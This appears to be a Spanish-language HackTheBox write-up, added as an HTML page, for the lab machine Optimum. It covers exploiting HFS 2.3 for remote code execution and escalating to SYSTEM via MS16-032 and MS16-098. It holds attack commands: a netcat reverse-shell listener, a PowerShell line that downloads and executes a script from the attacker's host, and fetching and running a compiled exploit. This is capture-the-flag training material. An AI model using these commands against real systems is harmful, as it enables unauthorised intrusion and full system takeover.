@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB - Optimum | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-danger fs-6">HackTheBox</span>
+        <span class="badge bg-success fs-6">Easy</span>
+        <span class="badge bg-secondary">Windows</span>
+        <span class="badge bg-secondary">HFS</span>
+        <span class="badge bg-secondary">RCE</span>
+        <span class="badge bg-secondary">MS16-032</span>
+        <span class="badge bg-secondary">MS16-098</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">Optimum</h1>
+      <p class="text-secondary mb-3">HFS 2.3 vulnerable a RCE; escalada con MS16-032 (Empire) o MS16-098 a NT AUTHORITY\SYSTEM.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">searchsploit</span>
+        <span class="badge bg-dark border border-secondary p-2">windows-exploit-suggester</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 80 -Pn -n 10.10.10.8 -oN targeted</code></pre>
+      </div><img src="img/htb-optimum/204738.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Puerto 80 - HFS 2.3 RCE</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>searchsploit hfs 2.3
+searchsploit -m windows/remote/39161.py</code></pre>
+      </div><div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>python 39161.py
+sudo python3 -m http.server 80
+sudo nc -lvp 443</code></pre>
+      </div><img src="img/htb-optimum/152819.png" class="img-fluid rounded mb-3 border border-secondary" alt="hfs shell">
+      <div class="code-block mb-3"><pre><code>type C:\Users\kostas\Desktop\user.txt.txt</code></pre></div>
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - MS16-032 (Empire)</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>./windows-exploit-suggester.py --database 2020-10-25-mssb.xls --systeminfo systeminfo.txt</code></pre>
+      </div><img src="img/htb-optimum/014308.png" class="img-fluid rounded mb-3 border border-secondary" alt="suggester">
+      <p class="text-secondary">Usamos Invoke-MS16032 (Empire) + Invoke-PowerShellTcp (Nishang):</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1</code></pre>
+      </div><div class="code-block mb-3"><pre><code>C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.14.27/Invoke-MS16032.ps1');</code></pre></div><img src="img/htb-optimum/025116.png" class="img-fluid rounded mb-3 border border-secondary" alt="nt authority system">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Alternativa - MS16-098</h4>
+      <img src="img/htb-optimum/023933.png" class="img-fluid rounded mb-3 border border-secondary" alt="ms16-098">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+sudo python3 -m http.server 80</code></pre>
+      </div><div class="code-block mb-3"><pre><code>powershell wget http://10.10.14.27/41020.exe -OutFile 41020.exe
+41020.exe</code></pre></div><img src="img/htb-optimum/021658.png" class="img-fluid rounded mb-3 border border-secondary" alt="system again">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>HFS 2.3 tiene un RCE publico; siempre ejecutar el exploit varias veces si no obtiene shell al primer intento.</li>
+<li>El Windows 32-bit vs 64-bit requiere usar sysnative para ejecutar PowerShell correcto.</li>
+<li>Siempre preparar multiples exploits de escalada (MS16-032, MS16-098) por si uno falla.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
